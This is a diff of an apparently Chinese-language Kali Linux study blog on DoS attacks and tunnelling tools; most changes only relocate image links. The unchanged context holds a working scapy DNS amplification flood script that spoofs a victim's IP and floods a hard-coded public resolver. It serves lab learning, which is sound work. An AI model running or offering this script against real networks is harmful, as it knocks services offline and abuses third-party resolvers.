@@ -429,7 +429,7 @@
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line">from time import sleep</span><br><span class="line">import thread</span><br><span class="line">import random</span><br><span class="line">import logging</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 4:</span><br><span class="line">    print &quot;用法：./dns_flood.py [IP地址] [利用的域名] [线程数]&quot;</span><br><span class="line">    print &quot;举例：./dns_flood.py 1.1.1.1 hp.com 20&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">dnsname = str(sys.argv[2])</span><br><span class="line">threads = int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">print &quot;正在执行 DNS Flood 攻击，按 Ctrl+C 停止攻击&quot;</span><br><span class="line">def dnsflood(target,dnsname):</span><br><span class="line">    while 0 == 0:</span><br><span class="line">        x = random.randint(0,65535)</span><br><span class="line">        send(IP(dst=&quot;202.96.134.133&quot;,src=target)/UDP(sport=x,dport=53)/DNS(rd=1,qdcount=1,qd=DNSQR(qname=dnsname,qtype=255)),verbose=0)</span><br><span class="line"></span><br><span class="line">for x in range(0,threads):</span><br><span class="line">    thread.start_new_thread(dnsflood,(target,dnsname))</span><br><span class="line"></span><br><span class="line">while 0 == 0:</span><br><span class="line">    sleep(1)</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=1503nDLGqXjIwmENcYCXt4Hkr5EAHJ9BLqjW16FyV1IYRnOO9gMW-0cVSvDhjyIdj_lTF19VL0yhWg7vnX-l0r-w6pYB6smOI_-nfpJc0ibm1xUZRlvb_2F6TgSdoCJn&file_name=/DNS%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB.PNG" alt="DNS放大攻击"></p>
+<p><img src="/images/kali/kali-notepad/DNS%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB.PNG" alt="DNS放大攻击"></p>
 
           
         
@@ -618,8 +618,8 @@
 </li>
 <li>IP分段偏移值的数据包，以Window10下的 <strong><code>🔺命令：ping -l 4000 192.168.0.1</code></strong></li>
 </ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=5beaT96bXY67_uk8iPr3eeNUo8c-ubeqogWbcVYV0ScJt8l_7DMBRvGvSpu8wDWEVsiKNRuqex7ftpNRsHsTylKf_EIjEujiAtp4ofZ2V-U4iE5qYOi8GRmxsj3405FuRX8&file_name=/IP%E5%88%86%E6%AE%B5%E5%81%8F%E7%A7%BB%E5%80%BC.PNG" alt="IP分段偏移值"></p>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=9f1a_3-CquCwJa5Si72D1v2mG529ISUXcQ0T5PzGpYdOuECyfnIJzivtCnyhAkjEygfrStj-QOFYdFtBi6Dg3gtdtFD_ed7l0HyLCABC1hXK_TWtw2AfAPc&file_name=/TearDrop.PNG" alt="TearDrop攻击"></p>
+<p><img src="/images/kali/kali-notepad/IP%E5%88%86%E6%AE%B5%E5%81%8F%E7%A7%BB%E5%80%BC.PNG" alt="IP分段偏移值"></p>
+<p><img src="/images/kali/kali-notepad/TearDrop.PNG" alt="TearDrop攻击"></p>
 <ul>
 <li>Ping大包，比较正常分段与teardrop攻击流量的区别</li>
 <li>针对早期windows系统SMB协议的攻击<ul>
@@ -847,7 +847,7 @@
 </ul>
 </li>
 </ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=ecf9kHo1arl_kZP61rNqhSJunjTth3MCHAa59FVQyZfJl_RpsW_Ym-SlfpGWCtf8I1vQfSxITqNiaWpLQLK_Eiaia2B9ayVj4sb7CILix1uDs6rSN87fVmVuNJCrlyeMWRMykM0zJqVR_XWZ4w&file_name=/sockstress%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B5%84%E6%BA%90%E5%9B%BE.PNG" alt="服务器资源图"></p>
+<p><img src="/images/kali/kali-notepad/sockstress%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B5%84%E6%BA%90%E5%9B%BE.PNG" alt="服务器资源图"></p>
 <h4 id="4-实验–C脚本"><a href="#4-实验–C脚本" class="headerlink" title="4. 实验–C脚本"></a>4. 实验–C脚本</h4><ul>
 <li>Metasploit（被攻击者）<ul>
 <li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
@@ -1286,7 +1286,7 @@
 </li>
 <li>▲ 占去服务器最大的TCP连接方式，但不一定占满CPU和内存</li>
 </ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=bfd9JSNr7NJUic0IHqv65VC-xrfIKwhyJeMgH0_rUctPVl0m73_xJ4tzmrR40ED_h4X0BwsCM5cza5gkFnBavbFxdOXdydmorEOJqE9IoUegi5G9qwunLokN&file_name=/SYN-Flood.PNG" alt="Syn-Flood过程"></p>
+<p><img src="/images/kali/kali-notepad/Syn-Flood.PNG" alt="Syn-Flood"></p>
 <h4 id="2-实验–准备"><a href="#2-实验–准备" class="headerlink" title="2. 实验–准备"></a>2. 实验–准备</h4><ul>
 <li>Kali（攻击者）<ul>
 <li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
@@ -1528,18 +1528,18 @@
         
           
             <hr>
-<h4 id="1-TCP连接"><a href="#1-TCP连接" class="headerlink" title="1. TCP连接"></a>1. TCP连接</h4><p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=36a3IXsvHw1ur12Gqkwi96Ep5G049HecZzLAgwh2ScFae21FaTDOa2chcs_dWLY9qD06vQl8upON9Df5HfqdlFn5fup0Vd-a0D3M8873nco8g8vUcPCUfg876qigANSB&file_name=/TCP%E5%8D%8F%E8%AE%AE%E8%BF%87%E7%A8%8B.PNG" alt="TCP协议过程"></p>
+<h4 id="1-TCP连接"><a href="#1-TCP连接" class="headerlink" title="1. TCP连接"></a>1. TCP连接</h4><p><img src="/images/kali/kali-notepad/TCP%E5%8D%8F%E8%AE%AE%E8%BF%87%E7%A8%8B.PNG" alt="TCP协议过程"></p>
 <ul>
 <li>TCP三次握手<ul>
 <li>▲ TCP三次握手其实不是可靠的，存在悖论，最后一次握手的ACK无法确定服务器已收到</li>
 </ul>
 </li>
 </ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=b351ZG8u9CsMMGf92Sp3n_hIBGC4pbd6Zzsk39mBjAG6qDwuWypf_q-jtvBe6CL9Jg0XXVX-ZFd6hSaHDLc0X9Xo_6BX12c-TNmdd-mmibk4HqVWmVoS7gl4C3Bg_X-o&file_name=/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B.PNG" alt="TCP三次握手过程"></p>
+<p><img src="/images/kali/kali-notepad/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B.PNG" alt="TCP三次握手"></p>
 <ul>
 <li>TCP四次挥手</li>
 </ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=d3089Fg1meXZhMPfx8zkd1UCJvoCtU1wF5WWumNUI8ETayLy6RWTFKZ1DLTeMFGNXFc-bBdE8v9nPyX7DT1IV0K7dXpz1BMJre2N67--r2j1rMsqmSwcF4LBrpq368ij&file_name=/TCP%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B.PNG" alt="TCP四次挥手过程"></p>
+<p><img src="/images/kali/kali-notepad/TCP%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B.PNG" alt="TCP四次挥手"></p>
 <h4 id="2-IP地址欺骗"><a href="#2-IP地址欺骗" class="headerlink" title="2. IP地址欺骗"></a>2. IP地址欺骗</h4><ul>
 <li>经常用于DoS攻击</li>
 <li>根据IP头地址寻址<ul>
@@ -1557,7 +1557,7 @@
 <li>▲ ISP设置出站流量的策略，对伪造源地址出站流量的过滤（边界防火墙）</li>
 <li>▲ ISP设置入站流量的策略，对伪造内网地址入站流量的过滤（边界防火墙） </li>
 </ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=7345C9loEbVvgjmXUdP5_vFaroaNe4GADf_UsZFu0zXqawp0T5NMSe4aAEcQLfCWeBVU_rE9JSYQp-I5Bp67n6o6aiRZJkRD2rkNMt14udEXhNZAlbzD47JdJ0XzleU&file_name=/IP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97.PNG" alt="IP地址欺骗"></p>
+<p><img src="/images/kali/kali-notepad/IP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97.PNG" alt="IP地址欺骗"></p>
 
           
         
@@ -1767,7 +1767,7 @@
 </ul>
 </li>
 </ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=cc69C-pmvobPxOEeSXQbCu7gJ7XWfinlg5u1AO7r8LXCdjrpOKpgzl2iLn5eGfNYfC2gcQVdIavpZf1ypTF3DUoYHgckdPti8gFH4LNgwRizkij4x2f5tt3G&file_name=/%E5%8C%BF%E5%90%8D%E8%80%85.PNG" alt="Anonymous匿名者"></p>
+<p><img src="/images/kali/kali-notepad/%E5%8C%BF%E5%90%8D%E8%80%85.PNG" alt="Anonymous匿名者"></p>
 <h4 id="2-DoS分类"><a href="#2-DoS分类" class="headerlink" title="2. DoS分类"></a>2. DoS分类</h4><ul>
 <li>D网络<ul>
 <li>基于巨量的Flood耗尽目标网络带宽资源（打掉服务器的出口带宽）</li>
@@ -1808,8 +1808,8 @@
 </li>
 <li>链路上任何一点都可成为目标</li>
 </ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=abc2y5RcuHZuXlXIOBS6HhY1tgLVCry_GYF-1wxkzVe5gI3gjwRkLoVJzfKNv3Qkicb0ycN2gnU4ADne6Tu97uyzBGNQNskMioWKdLVXV1PeBDpblInx2Lvj&file_name=/Dos%E9%93%BE%E8%B7%AF.PNG" alt="DoS链路"></p>
-<h4 id="4-DDoS分类方法"><a href="#4-DDoS分类方法" class="headerlink" title="4. DDoS分类方法"></a>4. DDoS分类方法</h4><p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=60c2T5xZxwJxsYvT3Ae2wYbDxYXkIh92SmJnFPU_uKvtTgxMZz9MwQTQIUKjzqs3SGN4NGQIrn5C2q7ZF5FfJEDZ3KH0MjMQMjpiGxM6j5lf5TA7rPQ5bLWZPQ&file_name=/DDoS%E5%88%86%E7%B1%BB.PNG" alt="DDoS分类方法"></p>
+<p><img src="/images/kali/kali-notepad/DoS%E9%93%BE%E8%B7%AF.PNG" alt="DoS链路"></p>
+<h4 id="4-DDoS分类方法"><a href="#4-DDoS分类方法" class="headerlink" title="4. DDoS分类方法"></a>4. DDoS分类方法</h4><p><img src="/images/kali/kali-notepad/DDoS%E5%88%86%E7%B1%BB%E6%96%B9%E6%B3%95.PNG" alt="DDoS分类方法"></p>
 
           
         
@@ -1990,7 +1990,7 @@
 <li>跨平台</li>
 <li>性能优</li>
 </ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=3f72W09Ypd4_m6RHZRqwRoRkZnmzeAu187W9ZcPJowoFAg0MJC4grBY12IBUcHbQnNJh_4gzoy_Wu-ZPj2FaFevlgbP_Dmtge6QNiQvTMbxe_uA00GlcNSA&file_name=/stunnel4.PNG" alt="stunnel4"></p>
+<p><img src="/images/kali/kali-notepad/stunnel4.PNG" alt="stunnel4"></p>
 <h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
 <li>Mono防火墙<ul>
 <li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
@@ -2271,7 +2271,7 @@
 </ul>
 </li>
 </ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=ed38YCIqLNmxjaaXrpNE_zl1ng5nkA0-PloYS83SCnUR6MG5eHTGwKuXdph1vuKkMB_a1IY9gq6g2erwSKlO-Ip9TsvIxfJmlbqacE4CZEbEULLv-w&file_name=/sslh.PNG" alt="sslh"></p>
+<p><img src="/images/kali/kali-notepad/sslh.PNG" alt="sslh"></p>
 <h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
 <li>Mono防火墙<ul>
 <li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
@@ -2539,7 +2539,7 @@
 <li>无法创建DNS隧道和ICMP隧道</li>
 <li>侦听端口开在本地上，可以指定需要访问的资源，服务器</li>
 </ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=0ff5dBvxxh2QYfBIyqN1n69zrQQQ3WfbJ6EIsassfHuRcwUyV5HU-y3TmKy2RtwpRwU7rnsCWcyzEEGRT9qJyRqcLQ_VyOBQwkWmo2LqRkqnFu-UQngypdc5vCI&file_name=/proxytunnel.PNG" alt="HTTP/HTTPS代理隧道"></p>
+<p><img src="/images/kali/kali-notepad/proxytunnel.PNG" alt="proxytunnel"></p>
 <h4 id="2-实验-1–准备"><a href="#2-实验-1–准备" class="headerlink" title="2. 实验-1–准备"></a>2. 实验-1–准备</h4><ul>
 <li>将外网资源映射为内网指定端口</li>
 <li>Mono防火墙<ul>
@@ -2559,7 +2559,7 @@
 </ul>
 </li>
 </ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=20ea47jfCKJ8tyRlcsMN_-I8Tjv6aAOYiun_Sm85oK1qqReUoamxOqxABJw1MoSipmiWZKutsr0kdVmPC9kpBLJ_oN_yruhSsaHVYkxP7uj-LehXu1c2FhO98T3L_9BwxTWn2Bvo&file_name=/proxytunnel-%E5%AE%9E%E9%AA%8C%E4%B8%80.PNG" alt="proxytunnel实验-1"></p>
+<p><img src="/images/kali/kali-notepad/proxytunnel%E5%AE%9E%E9%AA%8C-1.PNG" alt="proxytunnel实验-1"></p>
 <h4 id="3-实验-1"><a href="#3-实验-1" class="headerlink" title="3. 实验-1"></a>3. 实验-1</h4><ul>
 <li>bodhi（代理服务器）<ul>
 <li>浏览器登陆mono防火墙，增加规则只允许HTTP80访问，LAN -&gt; WAN HTTP</li>
@@ -2629,7 +2629,7 @@
 </ul>
 </li>
 </ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=a7cez7_WJG3fQHBcB9CBgiLtXv1ZFPxvrWzfdzq5EwRfHARUwA8k6kcEpl2kk3pPqqKUdyXMI849QvHyqkeLYFKHYSOCC_Sei0VbXQ3RT6wf-HD3qCZyw0JG7A0wn_AKs3z18jR1&file_name=/proxytunnel-%E5%AE%9E%E9%AA%8C%E4%BA%8C.PNG" alt="proxytunnel实验-2"></p>
+<p><img src="/images/kali/kali-notepad/proxytunnel%E5%AE%9E%E9%AA%8C-2.PNG" alt="proxytunnel实验-2"></p>
 <h4 id="5-实验-2"><a href="#5-实验-2" class="headerlink" title="5. 实验-2"></a>5. 实验-2</h4><ul>
 <li>bodhi（代理服务器）<ul>
 <li>浏览器登陆mono防火墙，增加规则只允许HTTP80访问，LAN -&gt; WAN HTTP</li>
@@ -2685,7 +2685,7 @@
 </li>
 <li>▲ 2020.2.3数据包能抓到CONNECT的流量，但建立的SSH和HTTP都无法访问，数据包显示为Method Not Allowed方法不允许</li>
 </ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=0ba7GtLCdyzl3R0mqV9BcOddF59mehQa8RzVoYKWxBCmpCKyjBQUt_cOkWgv_CpWobHSDu54ECuyc8ef2XgmpiPiz6DxGJGHR6FvzlFItRCtpzt4OoIeng&file_name=/CONNECT.PNG" alt="CONNECT数据包"></p>
+<p><img src="/images/kali/kali-notepad/CONNECT.PNG" alt="CONNECT数据包"></p>
 <h4 id="6-实验-3"><a href="#6-实验-3" class="headerlink" title="6. 实验-3"></a>6. 实验-3</h4><ul>
 <li>ssh客户端配置自动创建代理链隧道</li>
 <li>PC（bodhi克隆）<ul>
@@ -2703,7 +2703,7 @@
 </li>
 <li>▲ 2020.2.3数据包能抓到CONNECT的流量，但建立的SSH无法访问，数据包显示为Method Not Allowed方法不允许</li>
 </ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=685fRLnG0FC7rVWbF8ZNWjg7qtn7l23wAEeh8hJtXZQ_wcGq435AlB8aSOT3DK07ZdakoQAHH4d-ywEAEYnpXr3RQzu2WkOZ2E0ysaLxSrfzw4W_CeUwuQNatdiZzxuN5w&file_name=/Method%20Not%20Allow.PNG" alt="Method Not Allow"></p>
+<p>![Method Not Allow](/images/kali/kali-notepad/Method Not Allow.PNG)</p>
 
           
         
